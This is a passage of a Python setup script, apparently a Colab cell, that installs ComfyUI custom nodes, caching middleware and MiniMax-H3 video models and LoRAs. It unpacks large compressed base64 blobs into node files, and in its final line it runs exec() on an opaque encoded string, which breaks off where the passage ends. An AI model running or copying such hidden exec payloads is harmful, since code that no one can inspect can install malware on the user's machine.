9iG7Xdlpfr8EY6RJxpvczKjtck83ks+zHdxzCtbZyjq6++nYu3IRN2vCn9OQrWXRKAzAR4UhqcY9+DqIMdVjYBAGPP4ODgYU6UGNdNHXanh5kRwDuAJyu1KicUYN//Bjo22P/hxDH8wmiXMjYV2m1cxB66dJmAOahL1ENP06dfARQdG4N92ZOC351GcIrlq+y70EnDTDlyDpGaH76qGCbV+9ccn1pcX6PgOaraij/3ezRX79iYFdTkAFItbnZ3AXl+xv7kH+4F99RHIbAEkFII/BVt8m+Cz8x6fBWqfz5P6wp0x9y22RUIfHUXyFpEG2hhareAnb+K/PEGhlzpf59TpkmE4WQYLmxeDhU2xz9eInK+CtITVwsWe9fysde9reJAqFn2AaQUOzsLJcUL6jqCMoZKjO0x5au9k4UNffTbxqz+3/irb+qvUhEM3QTx7wudRgs04i5kwBi1NiBIggi7f3d1ZZq9jtmE6j6U8Mk6Oh70zz62zsAOdq9y66rQsDv4ccv8N0vvvh95i1R8euuPPG06BrvZ2ZxHyU0pewjnsDFiv526goIMwxWEiJru3136ki4HEfNeuAQGHbz+cqxFNEY75HhxjsPmCVHHpgSBqft0Mr6x4jHBvBkDKuZYW3ICJsZUNVtn+R+XKAxgI37ChNkjHH65U155V1+7hq4uEL4yVvvFsd+O8tfyBUMi4XoKn88t3KYeRuxMpa+UNvlY8mhEtF3/GaloxrzJnHQxO0bH4eF8uId0r2nJfht2n80WHJjsPskhH6xvtUUd3tDa+rFxaoJL+FCPqGvOmg+J2DCWxBV0R8nOXGGX+eU+kgJHyO03Ofomzqs8X7DsPgkV3ZYEIhXnrjrX+1MlET5sNzvLiI18mJuZIUAS1svTUnv9SmUt6wSWeTyqXHtVsPSo9Ea+SSRwmgHWLMAUeqMaTIdbPgEhoEmPYvsrVKvZ2vPONgwBL5F2AJ0qxwCi7Ao7v7La19pTWiv3Rt/blZ9KGhOCEkUH2UHRpwherQ41SGiLs+YQTjzLh+OLQBKO7y50bABWlo8dnoTy9txe/sq9+6zTrRE4rGwrFVLMJJbB5IjyweklFB/AqeI8YLhtxQ9hyoJvSAddxv51gdMkawPU74YKUIZpaP2ctfu20QCmtiNJdDKGnNLSAaUvEABUTWBJdXzLMWrlgPUAL4URN1ARw5DvzEpb17SrgA1QgsWTVqxJQow1J+S/Iycnc3iZztrch2ii/vHqdAalWdGUBpRiXCfeXfpa8w/bmb0LvaC3wL2InElY9vnYJSSANiIslJhq+6sWBRrbXeqZba/EcMFW3irSE7F2+UV1ft8/fgqpKqNAEjGai5jB0glW+XbLvLmDSgO33rY0NhwYrm/fte+ccAvQiYffZneqPV2n4otk3e0Cn+y2+kBMHb4jcKBN9HQK1ztxUSZs31+okSr054c0IP4Ep4YkqyIC7B6L88pXKhW9oomHqZReEcYL3tmYQVFrss6DCofIy4TXaT0hhFPgIzkXgHRITOBu4QS6ANrfurnB+ZaNrChkzj3SPjYmvieODhzp/3d7uvBgbU2E6r6kfY2N0BvGvy7f/dXke/udcN4VX4vo+uVbOgC8e/Trgu0dsD/jul1NqishTDvnhsvgQnzJKIrxN2mGqn23IfekmkdLLIwjB/fihvblaWbsHnAmYvr30sbU9r6Jfn8lnoP0CSBEv31BTrRmJWU++r3z6YO/GKqY3bGMkLlorV6uLy+pJCm7wVAa20EufWrfuBh6gSHv1e67VFoOWuZHWMbaTFQkIv/rFGWEEFOsQb8E5f4s2qt3tu2SebGOVHRAFbkuaFNzea/tyTkjkkQg/7nkoOH6I8Up0YXNzd+sCivQSrqIPvseCZWwcTLggjdybpwFF07qQqBdJHlf7X2sVeQ+3GGH/gIn54gzyHpBe+E2UNDc+KwgJz3jd6uefykMfAd4rqgPola+EHgeioZALAwQTIYbMf4lWhqfPQ8G5QhHGicKQyaBIXJf0JL7rist4uLKDchM3quFGff4BsHu6yg6bWr3EMLJTbCf+YxIbgF99ZF97YD2/Rguus73zjdb2X7d2dbCTwKuRVd9E0eD+J0FHOM6tnkLSI30Pz0ZQ3fCf4SzVNtAR78ArnDiVsYNoBrbOXdvdueGcxqEqNAKCFrfSw35VLOflI05034yRln/zvsmyIa3hcA6Vp9ju8zXr82UBXz0BK83mcwDM/nZLmO7bmHrfFLbjYZoTblG3yddbOzpa23mT7WKAd9A0tATk+g3ufd4jXF6x9nyYhoqHw/XuKiM18q1jg4d6jw3jn/ze2Z4GbwCi4onDg+8cRV86/COwwNHBgZFhUYBfkJPOmSXhboftD787NDR4fIQdPtY7PNw37EYD1dzzrfhB0y2J+l/FHYkxlitN64UAV1TXyYWqmPq+VYRnjbd30qtwWF6+AGMsgohPd9RHeMQTZlaNsRP6bDe/6qv1TW4R63Zu71CdfaSjjfAJJ99+hIKuF5EIKBCsm7ztAd5c4jQvj5HFdA92WEYhbEW6JgCMqHpFteuEoHi9YYUahzcVyui4N6k/fgsiOUWIQLrjVBf3rBBJfJ6Xgj5DS9awZKUC39ncovin8lXZjNwy7sv9SiqnCUpRL891S3veI4lQNPdYEy1TEAiRk108KyIbuLUC7yu6/fBQ5esb9urtyg/3g1c3ubGgnSnBV0jind6hIVDLh/klMCLRvhelgH/Pi5hSrBafVLrmvVqJY5bK4aP6SUEoFXBfqMVUbFI55Y1a0ItIKup5B4XnHIwc6R8eOtb7Z+5QHIaYwBHjFxbwJRaKUV5DfRWAIF6GnkNxVPOmDppq39VFFW/e91aiK5HQMplEgvuQBhATepCGYxTPO9UV/3ZX64BWMk7q3Jh0LJc80eaK5Lj6E4n8LD94TiTaQDsGnjCazKXG6TFHPynsVvykbp6EIuKH/sXvIKjs0yKXqL2huCL+Vv0rbprxdNlMUjwABtce9Rag1P2m85LyyZkgC+h4OzqGlJEXFm1K7wCXe0ebebvL1x3P9SDHKdCJvd3VXBQ3PwsjXQZUVmDDPNURv+ieXqOLY0o3c+hjzJO7sJyZmY3/d92ggenWMiLG4B2gimOhgbDayQQNiUqHRIIf6x3p4zEQwQVOjzWVcrlMycgTFff+UeKJ812BcvQWTRk4jxg2Z/JVNhcAsc4NDYmTmoyz/WNveHSvcptDyIDkHQ8NjofPcQlmHwgFvedzPALr7S4mcdfIOBqLwpDTpWLd7XBoGIaY8Zh3Snl+nRktWUoIlHijMUYGB4+N9A8N+2+GOJwBoSSF4+Ngido5hFaOARGGEvcg0DPtuQL7wzC/jKjgKzRYMKYMvpI5UjFnAjRVmi7kylOwpEz0Wp1SYUcDo0KSJ+SQAoJCJMG93dVGq5z1qmXr3InRxzPjFBlHmrrA+aSr7MAZLHp8zkAVpAgqC8KjrmXRv90oFVkyo2sm896SgXY4jBaKccZBfuT87iZcGUVsSHKTImckgqeQkIke9yV4h0GXJuZTY4IeizlzKh54PYaLLyE683mF1iWpyNRXsL7EozeUmV8rhXdqyQpcypXXahX92fBlBZBx+UUGQA4o60Id6HQh4lxTNdZkFBPEqpFYa0JQ3MANz71+YTycCcZYZBphibmU4E6YP5aDknFJPIib692kIPgB4yKoz/GyOWmAVB0d7e4cD7wpjNf0Xko22t0x7scmv4qMuyWVIrKK95Iy9eoNzVNe4lGZM8kgPSBirAsNANGgySF4/9HjwPYnRndH5G6zyk6MWiUHFJElYyrkmAPXl0rJYUYC485FbVA+zjMEuhB5Lii8ma0DgyTVYYhZwtqBExbnN9KNtqp453cD+Jt3C7I3Hajd/iS/AZ2ufTkaj8djrFsC8cSf7Nf2716o7aOgoKcitZ9iLNIec3HTWrdNbyQ8cgjgwz38dpGIs8yj/hKjyppHr7oAaSs+wP+i+wMjEe/yqu1RNKgNzvsSyBgbbMaLtQiJjsB6iglMVOLpBGjgSkgCfa/fLe/NKHjbH/SCtsYeYqWYbNP0JNvkMSdIxHohQdGsyD89lXlW3Iz8CqMOqEPD9w2vDhTBlwMhxdjpuWgc0/1FvIOr0+dRHuNqZLWZxHRXwt1HEnxbo95545BkWISnkzExtXJzIYl8H6U4jM2jUBb27cW0y3otqGIEE2JEH5JJK4mDVA7b20fPCYn1cKEq8KDnvYxOHJyCFOIOW2hLi9ujlhbY8kHCECkZVPEDk1ICMQKnyGF8IDbEP7SREOHXYFoxv1DGgMVPLB77MALAeLO6kIe4eOEpB3W56EFyML0CmZwmmipQoiYs5dGdPHIR+pLqJAaBepA2psoF0ZwjfYJ0I1UrfN/SQuNQhgkSEuCDpKNiCUPpQVfOnZL9c8CQxCTFJcHy3FGjuXCA26DwQHj/2W9poZL93LO4W/zJJnh7E9ztQgFCEjp+d7grlfk9l1QCZ4mKy+2RiqvYdr/Tt30VFd7fQXKLDu5wLmWkDUX4D+qxKk2JG1Rq6YPQy6sr3JUAOEoAefk7KjzOgPNtOFcuJHUiR0NkejgF+n9OFMhghqsCp3KeuiUn5zxfyP1FT+JOOmZOl0r5Yndb2xT0sjwJzC/bNjxd0E90DZp/fPv1NjE/vmXb+g4Qd5IbYFr/lCucSAPgNhDq9TbYkUp6wXviG7709zW6BNpcOVRpmgxgkTEWztx8liLJ5wKgKKaoOuCw0HjT3P8FWH0eqw=="
for _rel_p, _content in json.loads(zlib.decompress(base64.b64decode(ROBOT_NATIVE_B64)).decode("utf-8")).items():
    _dst_p = os.path.join("/content/ComfyUI/custom_nodes", _rel_p)
    os.makedirs(os.path.dirname(_dst_p), exist_ok=True)
    with open(_dst_p, "w", encoding="utf-8") as _f:
        _f.write(_content)

os.makedirs("/content/ComfyUI/user/default/subgraphs", exist_ok=True)
_cc_init = "/content/ComfyUI/custom_nodes/Comfy-Canvas/__init__.py"
if os.path.exists(_cc_init):
    _cc_txt = open(_cc_init, "r", encoding="utf-8").read()
    if '"./web"' in _cc_txt:
        open(_cc_init, "w", encoding="utf-8").write(_cc_txt.replace('"./web"', '"./web/js"'))

_cm_final = "/content/ComfyUI/middleware/cache_middleware.py"
if os.path.exists("/content/ComfyUI/middleware"):
    open(_cm_final, "w", encoding="utf-8").write("""from aiohttp import web
from typing import Callable, Awaitable
import os, io, gzip
from PIL import Image

IMG_EXTENSIONS = (".jpg", ".jpeg", ".png", ".ppm", ".bmp", ".pgm", ".tif", ".tiff", ".webp", ".woff", ".woff2", ".ttf", ".svg")
_OBJ_INFO_CACHE = {"key": None, "raw": None, "gz": None, "ct": "application/json"}

def _model_state_key():
    parts = []
    for d in ("diffusion_models", "loras", "text_encoders", "vae", "latent_upscale_models", "checkpoints", "vae_approx"):
        p = f"/content/ComfyUI/models/{d}"
        if os.path.isdir(p):
            try:
                parts.append(",".join(sorted(os.listdir(p))))
            except Exception:
                pass
    cn = "/content/ComfyUI/custom_nodes"
    if os.path.isdir(cn):
        try:
            parts.append(",".join(sorted(os.listdir(cn))))
        except Exception:
            pass
    return "|".join(parts)

@web.middleware
async def cache_control(request: web.Request, handler: Callable[[web.Request], Awaitable[web.Response]]) -> web.Response:
    if request.path in ("/global_subgraphs", "/api/global_subgraphs") or request.path.startswith(("/global_subgraphs/", "/api/global_subgraphs/")):
        return web.Response(text="{}", content_type="application/json", headers={"Cache-Control": "public, max-age=3600"})
    if request.path in ("/object_info", "/api/object_info"):
        k = _model_state_key()
        accept_gz = "gzip" in request.headers.get("Accept-Encoding", "")
        if _OBJ_INFO_CACHE["key"] == k and _OBJ_INFO_CACHE["raw"] is not None:
            if accept_gz and _OBJ_INFO_CACHE["gz"] is not None:
                return web.Response(body=_OBJ_INFO_CACHE["gz"], content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
            return web.Response(body=_OBJ_INFO_CACHE["raw"], content_type=_OBJ_INFO_CACHE["ct"])
        resp = await handler(request)
        if resp.status == 200 and getattr(resp, "body", None):
            raw_b = bytes(resp.body)
            gz_b = gzip.compress(raw_b, compresslevel=5)
            _OBJ_INFO_CACHE["key"] = k
            _OBJ_INFO_CACHE["raw"] = raw_b
            _OBJ_INFO_CACHE["gz"] = gz_b
            if accept_gz:
                return web.Response(body=gz_b, content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
        return resp
    if request.path in ("/view", "/api/view") and not request.query.get("raw"):
        fn = request.query.get("filename", "")
        ftype = request.query.get("type", "output")
        sub = request.query.get("subfolder", "").strip("/")
        if fn.lower().endswith(".png") and ftype in ("output", "input", "temp"):
            base = f"/content/ComfyUI/{ftype}"
            fpath = os.path.join(base, sub, fn) if sub else os.path.join(base, fn)
            if os.path.isfile(fpath):
                try:
                    with Image.open(fpath) as im:
                        buf = io.BytesIO()
                        im.save(buf, format="WEBP", quality=85, method=1)
                        return web.Response(body=buf.getvalue(), content_type="image/webp", headers={"Cache-Control": "public, max-age=86400"})
                except Exception:
                    pass
    response: web.Response = await handler(request)
    if request.path.startswith("/extensions/"):
        response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
        return response
    if request.path.startswith("/assets/"):
        response.headers["Cache-Control"] = "public, max-age=604800, immutable"
    elif request.path.lower().endswith(IMG_EXTENSIONS) and response.status == 200:
        response.headers.setdefault("Cache-Control", "public, max-age=86400")
    if (
        isinstance(response, web.Response)
        and not isinstance(response, web.FileResponse)
        and getattr(response, "body", None)
        and isinstance(response.body, (bytes, bytearray))
        and len(response.body) > 1024
        and "Content-Encoding" not in response.headers
        and "gzip" in request.headers.get("Accept-Encoding", "")
    ):
        response.body = gzip.compress(bytes(response.body), compresslevel=5)
        response.headers["Content-Encoding"] = "gzip"
        response.headers["Content-Length"] = str(len(response.body))
    return response
""")
os.makedirs("/content/ComfyUI/custom_nodes/ComfyUI-TextCompat", exist_ok=True)
with open("/content/ComfyUI/custom_nodes/ComfyUI-TextCompat/__init__.py", "w", encoding="utf-8") as _tf:
    _tf.write("""class TextCompatNode:
    @classmethod
    def INPUT_TYPES(cls):
        return {"required": {"text": ("STRING", {"multiline": True, "default": ""})}}
    RETURN_TYPES = ("STRING",)
    RETURN_NAMES = ("string",)
    FUNCTION = "execute"
    CATEGORY = "utils"
    def execute(self, text=""):
        return (text,)
NODE_CLASS_MAPPINGS = {"Text": TextCompatNode}
NODE_DISPLAY_NAME_MAPPINGS = {"Text": "Text (Multiline)"}
""")

print(f"🎞️ [3/4] 正在多路并发下载音视频 VAE、潜空间放大器与 H3 专属 LoRA 池 (已耗时 {int(time.time()-t0)}s)...")
lora_dir = "/content/lora_pool_h3"
for _d in ["/content/ComfyUI/models/vae", "/content/ComfyUI/models/latent_upscale_models", "/content/ComfyUI/models/vae_approx", "/content/ComfyUI/models/ultralytics/bbox", lora_dir]:
    os.makedirs(_d, exist_ok=True)

batch_items = [
    ("https://huggingface.co/Comfy-Org/MiniMax-H3/resolve/main/vae/minimax_h3_video_vae_fp16.safetensors", "/content/ComfyUI/models/vae", "minimax_h3_video_vae_fp16.safetensors"),
    ("https://huggingface.co/Comfy-Org/MiniMax-H3/resolve/main/vae/minimax_h3_audio_vae_fp32.safetensors", "/content/ComfyUI/models/vae", "minimax_h3_audio_vae_fp32.safetensors"),
    ("https://huggingface.co/LBH-123-AI/Minimax_h3_latent_Upscaler/resolve/main/minimax_h3_latent_upscaler_3d_conv_v1/minimax_h3_latent_upscaler_3d_conv_v1_bf16.safetensors", "/content/ComfyUI/models/latent_upscale_models", "minimax_h3_latent_upscaler_3d_bf16.safetensors"),
    ("https://huggingface.co/Alissonerdx/Minimax-H3-ComfyUI/resolve/main/latent_upscaler/h3_upscaler_lms_v0.1.safetensors", "/content/ComfyUI/models/latent_upscale_models", "h3_upscaler_lms_v0.1.safetensors"),
    ("https://huggingface.co/Alissonerdx/Minimax-H3-ComfyUI/resolve/main/vae_approx/taeh3.safetensors", "/content/ComfyUI/models/vae_approx", "taeh3.safetensors"),
    ("https://huggingface.co/Bingsu/adetailer/resolve/main/face_yolov8m.pt", "/content/ComfyUI/models/ultralytics/bbox", "face_yolov8m.pt"),
    ("https://huggingface.co/Comfy-Org/MiniMax-H3/resolve/main/loras/minimax_h3_fl2v_turbo_8step_v1.0_comfyui_bf16.safetensors", lora_dir, "【8步加速LoRA-文生图生】minimax_h3_fl2v_turbo_8step.safetensors"),
    ("https://huggingface.co/Comfy-Org/MiniMax-H3/resolve/main/loras/minimax_h3_ref2v_turbo_4step_v0.1_comfyui_bf16.safetensors", lora_dir, "【4步加速LoRA-全能参考】minimax_h3_ref2v_turbo_4step.safetensors"),
    ("https://huggingface.co/RunningHubAI/rh-minimax-h3v0.1-feihouremix-v0.6-compat-v001.safetensors-lora/resolve/main/Minimax%20H3%E7%9C%9F%E5%AE%9E%E7%94%B5%E5%BD%B1%E8%B4%A8%E6%84%9FV0.1_FeiHouRemix_v0.6_compat_v001_T8.safetensors", lora_dir, "【电影质感LoRA】Minimax_H3_Cinema_v0.1.safetensors"),
    ("https://huggingface.co/pablodawson/MiniMax-H3-360-Orbit-LoRA/resolve/main/minimax_h3_flf2v_lora_v1.safetensors", lora_dir, "【360度环绕运镜LoRA】minimax_h3_flf2v_lora_v1.safetensors"),
    ("https://huggingface.co/HAOOOOOOO51/Minimax_h3_fl2v_lightx2v_turbo_4to8step_v0.1-v1.0_768p_v4_step600_dareties_fro095_pruned/resolve/main/minimax_h3_fl2v_lightx2v_turbo_4to8step_v0.1-v1.0_768p_v4_step600_dareties_fro095_pruned.safetensors", lora_dir, "【4步8步极速加速LoRA】minimax_h3_dmad_full_dareties_v4_step600_comfy_fro.safetensors"),
    ("https://huggingface.co/JOKER141/MiniMax-H3-Combat-Base-V2/resolve/main/H3_Combat_V2.safetensors", lora_dir, "【C站增强-武打动作增强V2】H3_Combat_V2.safetensors"),
    ("https://huggingface.co/JOKER141/MiniMax-H3-General-Motion-Continuity-Repair/resolve/main/Motion_Repair_V2.safetensors", lora_dir, "【C站增强-动作防崩坏修复V2】Motion_Repair_V2.safetensors"),
    ("https://huggingface.co/JOKER141/H3-Fight-Flow-Fight-Interaction-LoRA/resolve/main/H3_Fight_Flow_V1.safetensors", lora_dir, "【C站增强-格斗连招丝滑流畅】H3_Fight_Flow_V1.safetensors"),
    ("https://huggingface.co/lynaNSFW/mysticxxx_MM_H3/resolve/main/MysticXXX_MMH3-V4.safetensors", lora_dir, "【C站成人-双人互动增强V1】MysticXXX_MMH3-V1.safetensors"),
]

aria_lines = []
for url, ddir, fname in batch_items:
    out_p = os.path.join(ddir, fname)
    if not os.path.exists(out_p) or os.path.getsize(out_p) < 100 * 1024:
        aria_lines.append(f"{url}\n  dir={ddir}\n  out={fname}")

if aria_lines:
    with open("/tmp/cell1_dl.txt", "w", encoding="utf-8") as f:
        f.write("\n".join(aria_lines) + "\n")
    subprocess.run(["aria2c", "-i", "/tmp/cell1_dl.txt", "-c", "-j", "8", "-x", "16", "-s", "16", "--file-allocation=none", "--console-log-level=warn", "--summary-interval=0", "--user-agent=Mozilla/5.0"], check=False)

civitai_loras = [
    ("【C站增强-动作快慢速率滑块】H3_speed_slider_1.1.safetensors", "https://civitai.com/api/download/models/3389300"),
    ("【真人皮肤去油光LoRA】MMH3_RealismSlider_V1.safetensors", "https://civitai.red/api/download/models/3421124?fileId=3315156"),
    ("【细节锐化增强LoRA】MMH3_DetailSlider_V1.safetensors", "https://civitai.red/api/download/models/3314964"),
    ("【动作速度调节LoRA】MMH3_ActionSpeedSlider_V1.safetensors", "https://civitai.red/api/download/models/3409409"),
]
def _dl_civ(item):
    fname, durl = item
    fpath = os.path.join(lora_dir, fname)
    if not os.path.exists(fpath) or os.path.getsize(fpath) < 1000:
        try:
            req = urllib.request.Request(durl, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=20) as resp, open(fpath, "wb") as f:
                f.write(resp.read())
        except Exception:
            pass

with ThreadPoolExecutor(max_workers=4) as ex:
    list(ex.map(_dl_civ, civitai_loras))

print(f"📂 [4/4] 正在部署 16 套 H3 中文旗舰工作流 (已耗时 {int(time.time()-t0)}s)...")
os.makedirs("/content/ComfyUI/input", exist_ok=True)
if not os.path.exists("/content/ComfyUI/input/song83_magnetic.mp3"):
    subprocess.run("ffmpeg -y -f lavfi -i 'sine=frequency=440:duration=5' -ac 2 -ar 44100 /content/ComfyUI/input/song83_magnetic.mp3 >/dev/null 2>&1", shell=True)
if not os.path.exists("/content/ComfyUI/input/MV02I.mp4"):
    subprocess.run("ffmpeg -y -f lavfi -i 'testsrc=duration=5:size=832x480:rate=24' -f lavfi -i 'sine=frequency=440:duration=5' -c:v libx264 -pix_fmt yuv420p -c:a aac -shortest /content/ComfyUI/input/MV02I.mp4 >/dev/null 2>&1", shell=True)

wf_dir = "/content/ComfyUI/user/default/workflows"
wf_pool_h3 = "/content/wf_pool_h3"
os.makedirs(wf_dir, exist_ok=True)
os.makedirs(wf_pool_h3, exist_ok=True)
import zlib as _vz, base64 as _vb; exec(_vz.decompress(_vb.b64decode("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